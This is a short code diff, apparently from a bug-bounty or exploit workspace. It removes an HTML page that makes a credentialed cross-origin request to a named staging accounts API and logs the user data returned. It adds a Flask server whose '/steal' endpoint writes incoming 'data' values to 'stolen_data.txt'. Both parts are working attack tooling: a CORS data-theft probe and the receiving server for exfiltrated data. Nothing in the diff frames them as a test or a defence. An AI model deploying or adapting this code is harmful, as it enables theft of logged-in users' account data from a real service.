@@ -1,18 +1,13 @@
-<!DOCTYPE html>
-<html>
-<body>
-  <h3>CORS Test (XHR)</h3>
-  <script>
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://accounts-staging.cbhq.net/api/v1/me", true);
-    xhr.withCredentials = true;
-    xhr.onload = function() {
-      console.log("✅ Response:", xhr.responseText);
-    };
-    xhr.onerror = function(err) {
-      console.error("❌ XHR Error:", err);
-    };
-    xhr.send();
-  </script>
-</body>
-</html>
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/steal', methods=['GET'])
+def steal():
+    data = request.args.get('data')
+    with open('stolen_data.txt', 'a') as f:
+        f.write(data + '\n')
+    return "OK"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
